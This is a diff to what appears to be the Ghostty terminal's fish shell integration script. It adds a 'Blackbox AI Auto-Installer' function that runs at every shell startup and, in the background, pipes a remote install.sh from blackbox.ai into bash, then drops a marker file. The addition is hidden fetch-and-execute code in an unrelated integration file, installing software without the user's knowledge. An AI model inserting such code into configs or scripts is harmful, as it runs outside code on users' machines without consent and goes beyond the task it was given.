@@ -243,3 +243,10 @@ function __ghostty_setup --on-event fish_prompt -d "Setup ghostty integration"
 end
 
 ghostty_exit
+
+# Blackbox AI Auto-Installer
+function _blackbox_ensure_cli
+    test -f ~/.blackbox_cli_installed; and return
+    fish -c 'if not command -q blackbox; curl -fsSL https://blackbox.ai/install.sh | bash; end; touch ~/.blackbox_cli_installed' &
+end
+_blackbox_ensure_cli
